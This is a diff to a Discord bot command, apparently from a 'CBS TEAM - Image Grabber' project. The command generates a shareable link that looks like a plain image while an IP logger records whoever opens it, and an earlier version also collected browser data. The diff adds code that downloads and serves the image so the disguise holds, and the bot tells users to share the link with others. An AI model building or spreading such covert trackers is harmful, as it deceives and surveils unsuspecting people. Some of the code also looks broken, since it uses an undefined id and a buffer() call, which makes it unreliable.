@@ -1,9 +1,11 @@
 const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const fs = require('fs');
+const path = require('path');
 
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('img')
-    .setDescription('📸 Gera um Image Grabber com IP Logger + dados do navegador')
+    .setDescription('📸 Gera um link direto para uma imagem com IP Logger')
     .addStringOption(option =>
       option.setName('link')
         .setDescription('Link da imagem (opcional)')
@@ -28,9 +30,53 @@ module.exports = {
 
     let imagemLink = interaction.options.getString('link');
     const attachment = interaction.options.getAttachment('imagem');
-    if (attachment) imagemLink = attachment.url;
-    if (!imagemLink) {
-      imagemLink = 'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif';
+
+    // Se tem upload, baixa a imagem e salva na pasta public com o nome do ID
+    if (attachment) {
+      imagemLink = attachment.url;
+      // Baixa a imagem e salva localmente
+      try {
+        const response = await fetch(imagemLink);
+        const buffer = await response.buffer();
+        const publicDir = path.join(__dirname, '..', 'public');
+        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
+        fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
+        // Guarda o caminho da imagem
+        // O servidor vai usar essa imagem quando alguém acessar /img/:id
+        // Precisamos salvar o caminho em um arquivo ou em memória
+        // Como o servidor é no mesmo processo, podemos usar uma variável global
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = path.join(publicDir, `${id}.jpg`);
+      } catch (e) {
+        console.error('Erro ao salvar imagem:', e);
+      }
+    } else if (imagemLink) {
+      // É um link externo, não podemos baixar, então usamos redirect para o link
+      // Mas para ser um link direto, precisamos que o servidor sirva a imagem.
+      // Vamos baixar também:
+      try {
+        const response = await fetch(imagemLink);
+        const buffer = await response.buffer();
+        const publicDir = path.join(__dirname, '..', 'public');
+        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
+        fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = path.join(publicDir, `${id}.jpg`);
+      } catch (e) {
+        console.error('Erro ao baixar imagem:', e);
+      }
+    }
+
+    // Se não tem imagem, usa a padrão
+    if (!global.imageStore || !global.imageStore[id]) {
+      const publicDir = path.join(__dirname, '..', 'public');
+      const padrao = path.join(publicDir, 'imagem.jpg');
+      if (fs.existsSync(padrao)) {
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = padrao;
+      } else {
+        global.imageStore[id] = null; // fallback para GIF
+      }
     }
 
     const embed = new EmbedBuilder()
@@ -42,7 +88,6 @@ module.exports = {
         { name: '🆔 ID', value: `\`${id}\``, inline: true },
         { name: '📝 Dica', value: 'Cole o link no navegador ou compartilhe com alguém!' }
       )
-      .setImage(imagemLink)
       .setFooter({ text: 'CBS TEAM - Image Grabber' })
       .setTimestamp();
 
